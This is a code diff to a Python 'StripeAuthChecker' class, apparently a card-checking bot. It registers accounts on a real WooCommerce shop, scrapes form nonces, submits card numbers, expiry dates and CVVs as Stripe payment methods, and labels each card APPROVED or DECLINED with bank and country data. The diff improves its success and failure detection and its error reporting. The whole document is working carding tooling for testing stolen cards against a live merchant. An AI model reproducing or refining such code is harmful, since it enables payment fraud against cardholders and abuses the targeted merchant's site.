@@ -225,23 +225,23 @@ class StripeAuthChecker:
 
     async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time):
         bin_info = await self.get_bin_info(cc)
-        emoji = "✅" if "𝑨𝓟𝓟𝓡𝓞𝓥𝓔𝓓" in status else "❌"
+        emoji = "✅" if "APPROVED" in status else "❌"
 
         return (
             "╔═✦✧✦═╦═✦✧✦═╦═✦✧✦═╗\n"
-            f"⚡ 𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱 𝓒𝓱𝓮𝓬𝓴\n"
-            "─────────◆─────────\n"
-            f" 𝑺𝒕𝒂𝒕𝒖𝒔: {status} {emoji}\n"
-            f" 𝑮𝑨𝑻𝑬 : 𝘚𝘵𝘳𝘪𝘱𝘦𝘈𝘶𝘵𝘩♻️\n"
-            f" 𝑪𝑪: `{cc}|{mes}|{ano}|{cvv}`\n"
-            "─────────◆─────────\n"
-            f" 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆: {message}\n"
-            f" 𝑩𝒂𝒏𝒌: {bin_info['bank']}\n"
-            f" 𝑻𝒚𝒑𝒆: {bin_info['scheme']} - {bin_info['type']}\n"
-            f" 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: {bin_info['country']}({bin_info['country_code']})\n"
-            "─────────◆─────────\n"
-            f" 𝑻𝒊𝒎𝒆: {elapsed_time:.2f}s\n"
-            f" 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @{username}\n"
+            f"│ ⚡ 𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱 𝓒𝓱𝓮𝓬𝓴\n"
+            "├──────────◆───────────┤\n"
+            f"│  𝑺𝒕𝒂𝒕𝒖𝒔: {status} {emoji}\n"
+            f"│  𝑮𝑨𝑻𝑬 : 𝘚𝘵𝘳𝘪𝘱𝘦𝘈𝘶𝘵𝘩♻️\n"
+            f"│  𝑪𝑪: `{cc}|{mes}|{ano}|{cvv}`\n"
+            "├──────────◆───────────┤\n"
+            f"│  𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆: {message}\n"
+            f"│  𝑩𝒂𝒏𝒌: {bin_info['bank']}\n"
+            f"│  𝑻𝒚𝒑𝒆: {bin_info['scheme']} - {bin_info['type']}\n"
+            f"│  𝑪𝒐𝒖𝒏𝒕𝒓𝒚: {bin_info['country']}({bin_info['country_code']})\n"
+            "├──────────◆───────────┤\n"
+            f"│  𝑻𝒊𝒎𝒆: {elapsed_time:.2f}s\n"
+            f"│  𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @{username}\n"
             "╚═✦✧✦═╩═✦✧✦═╩═✦✧✦═╝"
         )
 
@@ -257,7 +257,7 @@ class StripeAuthChecker:
         )
 
     async def format_mass_response(self, cc, mes, ano, cvv, status, message, bin_info):
-        status_emoji = "✅" if "𝑨𝓟𝓟𝓡𝓞𝓥𝓔𝓓" in status else "❌"
+        status_emoji = "✅" if "APPROVED" in status else "❌"
         return (
             f"Card :  {cc}|{mes}|{ano}|{cvv}\n"
             f"Status : {status} {status_emoji}\n"
@@ -329,7 +329,7 @@ class StripeAuthChecker:
                     reg_page = await client.get("https://blackdonkeybeer.com/my-account/", timeout=15.0)
                     nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', reg_page.text)
                     if not nonce_match:
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "𝑪𝓪𝓻𝓭 𝓲𝓼 𝓭𝓮𝓬𝓵𝓲𝓷𝓮𝓭", username, time.time()-start_time)
+                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Registration failed - cannot get nonce", username, time.time()-start_time)
                 except (httpx.TimeoutException, httpx.ConnectError):
                     return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection timeout", username, time.time()-start_time)
 
@@ -368,10 +368,21 @@ class StripeAuthChecker:
                 except (httpx.TimeoutException, httpx.ConnectError):
                     return await self.format_response(cc, mes, ano, cvv, "ERROR", "Registration timeout", username, time.time()-start_time)
 
-                # Check if registration was successful by checking the response URL
+                # Check if registration was successful by checking the response URL and content
                 reg_res_url = str(reg_res.url)
-                if "dashboard" not in reg_res.text.lower() and "my-account" not in reg_res_url:
-                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "𝑪𝓪𝓻𝓭 𝓲𝓼 𝓭𝓮𝓬𝓵𝓲𝓷𝓮𝓭", username, time.time()-start_time)
+                reg_res_text = reg_res.text.lower()
+                
+                # More comprehensive registration success checks
+                registration_success = (
+                    "dashboard" in reg_res_text or 
+                    "my-account" in reg_res_url or
+                    "logout" in reg_res_text or
+                    "account details" in reg_res_text or
+                    "hello" in reg_res_text
+                )
+                
+                if not registration_success:
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Registration failed - cannot create account", username, time.time()-start_time)
 
                 # Get payment method page to extract Stripe elements
                 try:
@@ -382,7 +393,7 @@ class StripeAuthChecker:
                 # Extract the form nonce
                 form_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', payment_page.text)
                 if not form_nonce_match:
-                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "𝑪𝓪𝓻𝓭 𝓲𝓼 𝓭𝓮𝓬𝓵𝓲𝓷𝓮𝓭", username, time.time()-start_time)
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Cannot get payment form nonce", username, time.time()-start_time)
 
                 form_nonce = form_nonce_match.group(1)
 
@@ -419,22 +430,61 @@ class StripeAuthChecker:
                 except (httpx.TimeoutException, httpx.ConnectError):
                     return await self.format_response(cc, mes, ano, cvv, "ERROR", "Payment timeout", username, time.time()-start_time)
 
-                # Check if the payment method was added successfully
+                # Check if the payment method was added successfully - IMPROVED DETECTION
                 payment_res_url = str(payment_res.url)
-                payment_res_text = payment_res.text
+                payment_res_text = payment_res.text.lower()
 
-                if "payment method successfully added" in payment_res_text.lower() or "payment-methods" in payment_res_url:
-                    return await self.format_response(cc, mes, ano, cvv, "𝑨𝓟𝓟𝓡𝓞𝓥𝓔𝓓", "Card successfully validated", username, time.time()-start_time)
+                # Comprehensive success detection
+                success_indicators = [
+                    "payment method successfully added",
+                    "payment-methods",
+                    "payment method has been added",
+                    "card added successfully",
+                    "payment method saved",
+                    "method added successfully"
+                ]
+
+                # Comprehensive failure detection
+                failure_indicators = [
+                    "declined",
+                    "invalid",
+                    "error",
+                    "failed",
+                    "cannot be processed",
+                    "try again",
+                    "unsuccessful",
+                    "card was declined",
+                    "card number is incorrect",
+                    "security code is invalid",
+                    "expiration date is invalid"
+                ]
+
+                success_detected = any(indicator in payment_res_text for indicator in success_indicators)
+                failure_detected = any(indicator in payment_res_text for indicator in failure_indicators)
+
+                if success_detected:
+                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Card successfully added to payment methods", username, time.time()-start_time)
+                elif failure_detected:
+                    # Try to extract specific error message
+                    error_match = re.search(r'<div[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</div>', payment_res.text, re.IGNORECASE | re.DOTALL)
+                    if error_match:
+                        error_message = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
+                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, time.time()-start_time)
+                    else:
+                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Card declined by issuer", username, time.time()-start_time)
                 else:
-                    # For all declined cases, return simple "𝑪𝓪𝓻𝓭 𝓲𝓼 𝓭𝓮𝓬𝓵𝓲𝓷𝓮𝓭" message
-                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "𝑪𝓪𝓻𝓭 𝓲𝓼 𝓭𝓮𝓬𝓵𝓲𝓷𝓮𝓭", username, time.time()-start_time)
+                    # If we can't clearly determine, check URL pattern
+                    if "payment-methods" in payment_res_url:
+                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Card successfully added to payment methods", username, time.time()-start_time)
+                    else:
+                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Unable to add payment method", username, time.time()-start_time)
 
         except httpx.ConnectError:
             return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection error", username, time.time()-start_time)
         except httpx.TimeoutException:
             return await self.format_response(cc, mes, ano, cvv, "ERROR", "Timeout error", username, time.time()-start_time)
         except Exception as e:
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "System error", username, time.time()-start_time)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)}", username, time.time()-start_time)
 
     def format_result(self, result, username, user_plan):
         return result
